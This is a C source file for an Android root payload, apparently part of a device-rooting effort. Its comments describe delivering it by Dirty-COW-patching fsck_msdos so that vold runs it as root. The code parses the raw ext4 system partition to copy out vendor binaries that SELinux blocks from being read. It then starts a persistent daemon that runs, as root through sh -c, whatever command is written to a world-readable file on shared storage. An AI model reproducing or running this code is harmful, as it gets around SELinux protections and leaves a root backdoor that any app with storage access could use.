/* ext4_extract.c - session62 (vold-domain root payload)
 *
 * Pulls /system/bin/{bkup_bc_update,vtnvfsd} straight out of the raw ext4 on
 * the `system` partition (mmcblk0p42). We cannot open those files through the
 * VFS (SELinux: system_file read denied to vold), but the block device itself
 * is readable, so we parse ext4 by hand and copy the inode data out.
 *
 * Delivered the session26 way: Dirty-COW-patch /system/bin/fsck_msdos with this
 * payload, then eject+reinsert the microSD so vold execs it as root in
 * u:r:vold:s0. Payload forks; parent exits 0 so the vfat mount proceeds.
 * Read-only against the eMMC; a reboot clears the page-cache patch.
 *
 * Outputs (to /storage/emulated/legacy/):
 *   x_bkup_bc_update   extracted ELF
 *   x_vtnvfsd          extracted ELF
 *   extract_log.txt    progress/params
 */

typedef unsigned char  u8;
typedef unsigned short u16;
typedef unsigned int   u32;

#define SYS_exit  1
#define SYS_read  3
#define SYS_write 4
#define SYS_open  5
#define SYS_close 6
#define SYS_execve 11
#define SYS_lseek 19
#define SYS_getpid 20
#define SYS_kill  37
#define SYS_umask 60
#define SYS_dup2  63
#define SYS_clone 120
#define SYS_nanosleep 162

#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT  0100
#define O_TRUNC  01000

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a, r1 asm("r1") = b, r2 asm("r2") = c;
    register long r3 asm("r3") = d, r4 asm("r4") = e, r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }
static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static int memeq(const u8 *a, const char *b, int n)
{ int i; for (i = 0; i < n; i++) if (a[i] != (u8)b[i]) return 0; return 1; }

static const char *OUT = "/storage/emulated/legacy/";
static int logfd = -1;
static void lw(const char *s, long n) { if (logfd >= 0) sc6(SYS_write, logfd, (long)s, n, 0, 0, 0); }
static void ls(const char *s) { lw(s, slen(s)); }
static void ldec(long v)
{
    char t[24], b[24]; int j = 0, i;
    if (v < 0) { lw("-", 1); v = -v; }
    if (v == 0) { lw("0", 1); return; }
    while (v) { t[j++] = '0' + (v % 10); v /= 10; }
    for (i = 0; i < j; i++) b[i] = t[j - 1 - i];
    lw(b, j);
}
static void lhex(u32 v)
{
    char b[11]; int i; b[0] = '0'; b[1] = 'x';
    for (i = 0; i < 8; i++) { int d = (v >> ((7 - i) * 4)) & 0xf; b[2 + i] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[10] = ' '; lw(b, 11);
}

static u16 r16(const u8 *p) { return (u16)(p[0] | (p[1] << 8)); }
static u32 r32(const u8 *p) { return (u32)p[0] | ((u32)p[1] << 8) | ((u32)p[2] << 16) | ((u32)p[3] << 24); }

static u32 bsize, isize, ipg, gd_base, first_data_block, descsize;
static int devfd = -1;
static u8 blk[4096];
static u8 inodebuf[512];

static long rd(long off, u8 *buf, long len)
{
    if (sc6(SYS_lseek, devfd, off, 0, 0, 0, 0) < 0) return -1;
    long got = 0;
    while (got < len) {
        long r = sc6(SYS_read, devfd, (long)(buf + got), len - got, 0, 0, 0);
        if (r <= 0) break;
        got += r;
    }
    return got;
}

static u32 inode_table_blk(u32 group)
{
    u8 g[128];
    u32 off = gd_base + group * descsize;
    rd(off, g, descsize > 64 ? descsize : 64);
    return r32(g + 8);              /* bg_inode_table_lo (fs < 4 GiB, hi==0) */
}

static void ld_inode(u32 ino)
{
    u32 grp = (ino - 1) / ipg, idx = (ino - 1) % ipg;
    u32 tbl = inode_table_blk(grp);
    u32 off = tbl * bsize + idx * isize;
    rd(off, inodebuf, isize > 256 ? isize : 256);
}

#define MAXEX 512
static u32 exl[MAXEX], exp_[MAXEX], exn_[MAXEX];
static int excount;

static void collect(const u8 *hdr)
{
    u16 magic = r16(hdr + 0), ent = r16(hdr + 2), dep = r16(hdr + 6);
    if (magic != 0xF30A) { ls("  (no extent magic)\n"); return; }
    const u8 *e = hdr + 12; int i;
    for (i = 0; i < ent && excount < MAXEX; i++, e += 12) {
        if (dep == 0) {
            exl[excount] = r32(e + 0);
            exn_[excount] = r16(e + 4) & 0x7fff;
            exp_[excount] = r32(e + 8);
            excount++;
        } else {
            u32 leaf = r32(e + 4);
            static u8 lb[4096];
            if (leaf && rd(leaf * bsize, lb, bsize) == (long)bsize) collect(lb);
        }
    }
}

static u32 mapblk(u32 n)
{
    int i;
    for (i = 0; i < excount; i++)
        if (n >= exl[i] && n < exl[i] + exn_[i]) return exp_[i] + (n - exl[i]);
    return 0;
}

static u32 dirent_lookup(u32 dirino, const char *name)
{
    ld_inode(dirino);
    u32 size = r32(inodebuf + 0x04);
    u16 mode = r16(inodebuf + 0x00);
    if ((mode & 0xF000) != 0x4000) { ls("  not a dir\n"); return 0; }
    excount = 0; collect(inodebuf + 0x28);
    int nl = (int)slen(name);
    u32 nblk = (size + bsize - 1) / bsize, b;
    for (b = 0; b < nblk; b++) {
        u32 phys = mapblk(b);
        if (!phys) continue;
        if (rd(phys * bsize, blk, bsize) != (long)bsize) continue;
        u32 p = 0;
        while (p + 8 <= bsize) {
            u32 ino = r32(blk + p);
            u16 rl = r16(blk + p + 4);
            u8 nlen = blk[p + 6];
            if (rl < 8) break;
            if (ino && nlen == nl && memeq(blk + p + 8, name, nl)) return ino;
            p += rl;
        }
    }
    return 0;
}

static void extract(u32 ino, const char *outname)
{
    char path[192]; int i = 0; const char *o = OUT;
    while (*o) path[i++] = *o++;
    const char *n = outname; while (*n) path[i++] = *n++;
    path[i] = 0;

    ld_inode(ino);
    u32 size = r32(inodebuf + 0x04);
    excount = 0; collect(inodebuf + 0x28);

    int of = (int)sc6(SYS_open, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { ls("  open out fail "); ls(outname); ls("\n"); return; }

    u32 nblk = (size + bsize - 1) / bsize, b, done = 0;
    for (b = 0; b < nblk; b++) {
        u32 phys = mapblk(b);
        u32 w = size - done; if (w > bsize) w = bsize;
        if (!phys) {
            u8 zero[512]; int k; for (k = 0; k < 512; k++) zero[k] = 0;
            u32 z = w;
            while (z) { long ww = z > 512 ? 512 : z; sc6(SYS_write, of, (long)zero, ww, 0, 0, 0); z -= ww; }
        } else {
            if (rd(phys * bsize, blk, bsize) != (long)bsize) { ls("  read blk fail\n"); break; }
            sc6(SYS_write, of, (long)blk, w, 0, 0, 0);
        }
        done += w;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    ls("  wrote "); ls(outname); ls(" bytes="); ldec(done); ls("\n");
}

static void dump_range(u32 sblk, u32 nblk, const char *outname)
{
    char path[192]; int i = 0; const char *o = OUT;
    while (*o) path[i++] = *o++;
    const char *n = outname; while (*n) path[i++] = *n++;
    path[i] = 0;
    int of = (int)sc6(SYS_open, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { ls("  dump open fail\n"); return; }
    u32 b;
    for (b = 0; b < nblk; b++) {
        if (rd((long)(sblk + b) * bsize, blk, bsize) != (long)bsize) break;
        sc6(SYS_write, of, (long)blk, bsize, 0, 0, 0);
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    ls("  dumped "); ls(outname); ls(" blocks="); ldec(b); ls("\n");
}

static void log_inode_hex(void)
{
    int i;
    for (i = 0; i < 48; i++) { lhex(inodebuf[i]); }
    ls("\n");
}

/* ---- resident root command daemon (same delivery trick) ---- */
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }
static int seq(const char *a, const char *b) { while (*a && *b) { if (*a != *b) return 0; a++; b++; } return *a == *b; }

static void write_path(const char *path, const char *s)
{
    long f = sc6(SYS_open, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)s, slen(s), 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void write_hexline(const char *path, const char *tag, unsigned long v)
{
    char b[64]; int i = 0, k;
    while (*tag) b[i++] = *tag++;
    b[i++] = '0'; b[i++] = 'x';
    for (k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n';
    b[i] = 0;
    write_path(path, b);
}

static void write_raw(const char *path, const char *s, long n)
{
    long f = sc6(SYS_open, (long)path, O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)s, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}

struct timespec { long sec; long nsec; };
static char *sh_argv0 = "/system/bin/sh";
static char *sh_argc  = "sh";
static char *sh_argd  = "-c";
static char env0[] = "PATH=/sbin:/system/bin:/system/xbin";
static char env1[] = "HOME=/";
static char *sh_envp[] = { env0, env1, 0 };

static void run_daemon(void)
{
    char p_cmd[128], p_out[128], p_stat[128], p_alive[128], p_dbg[128];
    scpy(p_cmd, OUT);   scat(p_cmd, "rd_cmd");
    scpy(p_out, OUT);   scat(p_out, "rd_out");
    scpy(p_stat, OUT);  scat(p_stat, "rd_stat");
    scpy(p_alive, OUT); scat(p_alive, "rd_alive");
    scpy(p_dbg, OUT);   scat(p_dbg, "rd_dbg");

    write_path(p_alive, "started\n");
    write_path(p_stat, "idle\n");

    unsigned long beat = 0;
    for (;;) {
        write_hexline(p_alive, "beat=", beat++);
        long fd = sc6(SYS_open, (long)p_cmd, O_RDONLY, 0, 0, 0, 0);
        if (fd >= 0) {
            static char buf[8192];
            long n = sc6(SYS_read, fd, (long)buf, sizeof buf - 1, 0, 0, 0);
            sc6(SYS_close, fd, 0, 0, 0, 0, 0);
            if (n > 0) {
                buf[n] = 0;
                write_raw(p_dbg, buf, n);
                while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = 0;
                if (seq(buf, "RQUIT")) { write_path(p_stat, "quit\n"); ex(0); }
                write_path(p_cmd, "");
                write_path(p_stat, "busy\n");
                long child = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
                if (child == 0) {
                    long of = sc6(SYS_open, (long)p_out, O_WRONLY | O_CREAT | O_TRUNC, 0666, 0, 0, 0);
                    if (of >= 0) { sc6(SYS_dup2, of, 1, 0, 0, 0, 0); sc6(SYS_dup2, of, 2, 0, 0, 0, 0); sc6(SYS_close, of, 0, 0, 0, 0, 0); }
                    char *argv[4];
                    argv[0] = sh_argv0; argv[1] = sh_argd; argv[2] = buf; argv[3] = 0;
                    sc6(SYS_execve, (long)sh_argv0, (long)argv, (long)sh_envp, 0, 0, 0);
                    sc6(SYS_write, 2, (long)"execve failed\n", 15, 0, 0, 0);
                    ex(127);
                }
                long st = 0;
                {
                    register long r0 asm("r0") = child;
                    register long r1 asm("r1") = (long)&st;
                    register long r2 asm("r2") = 0;
                    register long r3 asm("r3") = 0;
                    register long r7 asm("r7") = 114;
                    asm volatile("svc 0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r3), "r"(r7) : "memory");
                }
                write_hexline(p_stat, "ok rc=", ((unsigned long)st >> 8) & 0xff);
            }
        }
        struct timespec ts; ts.sec = 1; ts.nsec = 0;
        sc6(SYS_nanosleep, (long)&ts, 0, 0, 0, 0, 0);
    }
}

static void init_ext4(void)
{
    u8 sb[1024];
    if (rd(1024, sb, 1024) != 1024) { ls("sb read fail\n"); ex(1); }
    if (r16(sb + 0x38) != 0xEF53) { ls("bad ext4 magic\n"); ex(1); }
    u32 logbs = r32(sb + 0x18);
    bsize = 1024u << logbs;
    isize = r16(sb + 0x58); if (!isize) isize = 128;
    ipg = r32(sb + 0x28);
    first_data_block = r32(sb + 0x14);
    u32 feat_in = r32(sb + 0x60);
    u16 dsz = r16(sb + 0xFE);
    descsize = (feat_in & 0x80) ? (dsz >= 64 ? dsz : 64) : 32;
    gd_base = (first_data_block + 1) * bsize;
}

static void kill_old(void)
{
    long me = sc6(SYS_getpid, 0, 0, 0, 0, 0, 0);
    char path[64]; long pid;
    for (pid = 1; pid < 32768; pid++) {
        int i = 0, j = 0; long v; const char *p, *c; char t[16];
        if (pid == me) continue;
        p = "/proc/"; while (*p) path[i++] = *p++;
        v = pid; if (!v) t[j++] = '0';
        while (v) { t[j++] = '0' + (v % 10); v /= 10; }
        while (j > 0) path[i++] = t[--j];
        c = "/comm"; while (*c) path[i++] = *c++; path[i] = 0;
        long fd = sc6(SYS_open, (long)path, O_RDONLY, 0, 0, 0, 0);
        if (fd < 0) continue;
        {
            char b[32];
            long n = sc6(SYS_read, fd, (long)b, 16, 0, 0, 0);
            sc6(SYS_close, fd, 0, 0, 0, 0, 0);
            if (n >= 10 && memeq((u8 *)b, "fsck_msdos", 10)) sc6(SYS_kill, (long)pid, 9, 0, 0, 0, 0);
        }
    }
}

void _start(void)
{
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    long pid_ = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid_ != 0) ex(0);

    kill_old();

    {
        char lp[128]; int i = 0; const char *o = OUT;
        while (*o) lp[i++] = *o++;
        const char *n = "extract_log.txt"; while (*n) lp[i++] = *n++;
        lp[i] = 0;
        logfd = (int)sc6(SYS_open, (long)lp, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    }

    ls("ext4_extract start\n");
    devfd = (int)sc6(SYS_open, (long)"/dev/block/platform/msm_sdcc.1/by-name/system", O_RDONLY, 0, 0, 0, 0);
    ls("devfd="); ldec(devfd); ls("\n");
    if (devfd < 0) { ls("open system failed\n"); ex(1); }

    init_ext4();
    ls("bsize="); ldec(bsize); ls(" isize="); ldec(isize);
    ls(" ipg="); ldec(ipg); ls(" descsize="); ldec(descsize); ls("\n");

    dump_range(96, 48, "dbg_meta.bin");
    ld_inode(2);
    ls("inode2 bytes: "); log_inode_hex();

    u32 binino = dirent_lookup(2, "bin");
    ls("bin ino="); ldec(binino); ls("\n");
    if (!binino) { ls("no /bin dir\n"); ex(1); }

    const char *targets[] = {
        "stp_server", "mfg_dc", "mfg_properties", "mfg_customization",
        "mfg_battery_monitor", "mfg_battery", "mfg_nvram", "mfg_security",
        "bbauthd", "bkup_bc_update", "vtnvfsd", 0
    };
    int ti;
    for (ti = 0; targets[ti]; ti++) {
        u32 fi = dirent_lookup(binino, targets[ti]);
        ls("target="); ls(targets[ti]); ls(" ino="); ldec(fi); ls("\n");
        if (fi) {
            char on[64]; int k = 0; const char *p = "x_";
            while (*p) on[k++] = *p++;
            p = targets[ti]; while (*p) on[k++] = *p++; on[k] = 0;
            extract(fi, on);
        }
    }

    ls("ext4_extract done, entering daemon\n");
    sc6(SYS_close, logfd, 0, 0, 0, 0, 0);
    run_daemon();
}
